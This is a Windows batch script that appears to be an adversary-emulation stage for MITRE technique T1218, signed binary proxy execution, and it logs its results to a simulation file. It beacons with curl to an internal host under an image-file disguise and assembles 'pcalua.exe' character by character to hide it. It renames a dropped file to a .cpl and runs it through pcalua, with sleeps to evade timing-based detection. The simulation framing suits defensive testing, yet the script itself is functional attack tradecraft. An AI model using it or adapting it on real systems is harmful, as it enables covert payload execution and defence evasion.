@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8788\599f4072
SET fpakbq=Macula-Stage0-8788
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8788-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=firelox.txt
SET fpldhe=8788
SET logfile=%APPDATA%\!yydue!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start=init>> "!logfile!" 2>nul

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>> "!logfile!" 2>nul

SET hbat=!rdzgrnne!
curl -k -s -o nul "!hbat!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_sent=!hbat!>> "!logfile!" 2>nul

ping -n 7 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ping_delay_complete>> "!logfile!" 2>nul

SET d1=p
SET d2=c
SET d3=a
SET d4=l
SET d5=u
SET d6=a
SET d7=.
SET d8=e
SET d9=x
SET d10=e
SET lolbin=!d1!!d2!!d3!!d4!!d5!!d6!!d7!!d8!!d9!!d10!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: lolbin_assembled=!lolbin!>> "!logfile!" 2>nul

SET n1=%yktnwwf%
SET n2=\
SET n3=%edjwtl%
SET src=!n1!!n2!!n3!
SET dst=!n1!\pcafile.cpl
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_source=!src!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_target=!dst!>> "!logfile!" 2>nul

if exist "!src!" (
    ren "!src!" "pcafile.cpl" 2>nul
    if exist "!dst!" (
        SET ttpresult=1
        SET errdetail=
    ) else (
        SET ttpresult=0
        SET errdetail=rename_failed
    )
) else (
    SET ttpresult=0
    SET errdetail=source_missing
)

echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!ttpresult!:!errdetail!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_logged_result=!ttpresult!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: choice_delay_complete>> "!logfile!" 2>nul

if !ttpresult! equ 1 (
    SET arg1=-a
    SET arg2=!dst!
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: executing_lolbin=!lolbin! !arg1! !arg2!>> "!logfile!" 2>nul
    !lolbin! !arg1! !arg2!
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: lolbin_executed>> "!logfile!" 2>nul
)

SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_complete=!rdelay!s>> "!logfile!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_end>> "!logfile!" 2>nul
ENDLOCAL